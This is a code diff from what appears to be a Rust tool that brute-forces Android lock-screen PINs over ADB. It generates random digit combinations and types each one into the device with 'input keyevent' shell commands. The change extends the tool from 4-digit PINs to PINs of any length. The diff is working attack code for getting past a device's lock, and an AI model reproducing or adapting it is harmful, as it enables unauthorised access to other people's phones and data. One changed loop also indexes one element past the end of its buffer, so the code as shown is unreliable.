@@ -10,19 +10,19 @@ use std::io::BufRead;
 use std::io::BufReader;
 
 
-pub struct Pin4D {}
+pub struct NPin {}
 
 
-impl Pin4D {
+impl NPin {
 
     // Generate & push random pins
-    pub fn random(device: &Device) {
+    pub fn random(device: &Device, length: usize) {
         // Necessary variables
         let mut comb: String = String::new();
         let mut att: u32 = 1;
         let mut ret_limit: u32 = 5;
 
-        let mut dig: Vec<u8> = [ 0, 0, 0, 0].to_vec();
+        let mut dig: Vec<u8> = vec![0; length];
 
 
         // Wake device
@@ -36,7 +36,9 @@ impl Pin4D {
         for ret in 1..=9999 {
 
             // Generate random combination
-            for i in 0..=3 {
+            for i in 0..=50 {
+                if i == length { break; }
+
                 dig[i] = thread_rng().gen_range(0..=9);
                 comb += &dig[i].to_string();  // Just for printing
                 dig[i] += 7;
@@ -50,7 +52,9 @@ impl Pin4D {
             println!("ATTEMPT: {att}  RETRY: {ret}  COMBINATION: {comb}");
 
             // Push combination
-            for i in 0..=3 {
+            for i in 0..=50 {
+                if i == length { break; }
+
                 device.execute_host_shell_command(&format!("input keyevent {:?}", dig[i])).expect("Failed to execute command");
                 sleep(Duration::from_millis(50));
             }
@@ -127,7 +131,7 @@ impl Pin4D {
             }
 
             // Push combination
-            for i in 0..=3 {
+            for i in 0..=line.len() {
                 device.execute_host_shell_command(&format!("input keyevent {:?}", dig[i])).expect("Failed to execute shell command");
                 sleep(Duration::from_millis(50));
             }
